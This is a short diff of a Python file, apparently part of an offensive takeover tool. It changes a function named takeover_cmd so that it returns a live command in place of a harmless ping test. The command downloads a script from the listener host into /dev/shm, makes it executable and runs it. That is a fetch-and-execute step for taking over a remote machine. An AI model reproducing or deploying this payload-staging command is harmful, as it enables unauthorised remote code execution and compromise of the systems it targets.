@@ -7,8 +7,8 @@ import time
 srv_run = True
 
 def takeover_cmd(listen_ip: str, listen_port: int) -> str:
-    # cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/prep.sh -o /dev/shm/prep.sh ; chmod +x /dev/shm/prep.sh ; /dev/shm/prep.sh {listen_ip} {listen_port}"
-    cmd_str = f"ping {listen_ip}"
+    cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/prep.sh -o /dev/shm/prep.sh ; chmod +x /dev/shm/prep.sh ; /dev/shm/prep.sh {listen_ip} {listen_port}"
+    # cmd_str = f"ping {listen_ip}"
     return cmd_str
 
 
